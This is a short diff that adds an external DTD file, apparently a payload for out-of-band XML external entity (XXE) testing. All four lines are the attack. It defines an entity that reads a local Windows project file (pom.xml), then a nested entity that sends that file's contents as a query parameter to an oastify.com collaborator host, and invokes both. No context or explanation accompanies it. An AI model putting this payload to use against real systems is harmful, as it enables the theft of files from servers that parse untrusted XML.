@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "C:\Users\Admin\IdeaProjects\Lohong2\pom.xml">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://9cmg6vm2qy0knyih1x1jexk8mzsqgg45.oastify.com?x=%file;'>">
+%eval;
+%exfiltrate;
